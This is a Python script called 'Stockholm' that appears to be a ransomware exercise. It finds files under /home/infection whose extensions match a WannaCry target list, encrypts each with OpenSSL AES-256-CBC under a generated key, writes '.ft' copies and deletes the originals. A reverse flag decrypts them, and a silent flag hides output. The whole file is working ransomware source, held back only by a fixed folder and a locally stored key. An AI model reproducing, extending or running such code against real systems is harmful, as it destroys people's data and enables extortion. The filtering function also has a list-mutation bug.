import os
import subprocess
import argparse
import base64

def parser():
    # parser work for -h or -help,
    # -v or -version
    # -r or -reverse
    # -s or -silent
    parser = argparse.ArgumentParser(
        description="Stockholm will encrypt all file on /home/infection directory using a key and add \".ft\" extension to the file."
    )
    parser.add_argument("-v", "-version", action="store_true", help="Show version")
    parser.add_argument("-r", "-reverse", action="store_true", help="Reverse the input")
    parser.add_argument("-s", "-silent", action="store_true", help="Silent mode")

    args = parser.parse_args()
    if args.v:
        print("Version 1.0")
        exit(0)
    return args

def generate_key():
    key = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
    with open("key.txt", "w") as f:
        f.write(key)
    return key

def getAllFiles(path):
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r, file))
    return files

def getOnlyFTFiles(files):
    ftFiles = []
    for file in files:
        if file.endswith(".ft"):
            ftFiles.append(file)
    return ftFiles

def keepGoodFiles(files):
    with open("wannacry_file_extensions.txt", "r") as f:
        extension = f.read()
    for file in files:
        fileExtension = '.' + file.split(".")[-1]
        if fileExtension not in extension:
            print(f"Removing {file}")
            files.remove(file)

def encrypt(data, key):
    process = subprocess.Popen(
        ['openssl', 'enc', '-aes-256-cbc', '-base64', '-pass', f'pass:{key}'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = process.communicate(input=data)
    if process.returncode != 0:
        raise Exception(f"OpenSSL encryption failed: {stderr.decode()}")
    return stdout

def encryptFiles(files, silent, key):
    print(f"Encrypt: {files}")
    for file in files:
        if not silent:
            print("Encrypting " + file)
        with open(file, "rb") as f:
            data = f.read()
            encrypted_data = encrypt(data, key)
        with open(file + ".ft", "wb") as f:
            f.write(encrypted_data)
        os.remove(file)

def decrypt(data, key):
    process = subprocess.Popen(
        ['openssl', 'enc', '-d', '-aes-256-cbc', '-base64', '-pass', f'pass:{key}'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    stdout, stderr = process.communicate(input=data)
    if process.returncode != 0:
        raise Exception(f"OpenSSL decryption failed: {stderr.decode()}")
    return stdout

def decryptFiles(files, silent, key):
    print(f"Decrypt: {files}")
    for file in files:
        if not silent:
            print("Decrypting " + file)
        with open(file, "rb") as f:
            data = f.read()
            decrypted_data = decrypt(data, key)
        with open(file[:-3], "wb") as f:
            f.write(decrypted_data)
        os.remove(file)

def main():
    args = parser()
    files = getAllFiles("/home/infection")
    if not os.path.exists("key.txt"):
        key = generate_key()
    else:
        with open("key.txt", "r") as f:
            key = f.read()
    print(f"all files: {files}")
    if args.r:
        files = getOnlyFTFiles(files)
        print(f"only ft files: {files}")
        decryptFiles(files, args.s, key)
    else:
        keepGoodFiles(files)
        print(f"Remove bad: {files}")
        encryptFiles(files, args.s, key)

if __name__ == "__main__":
    main()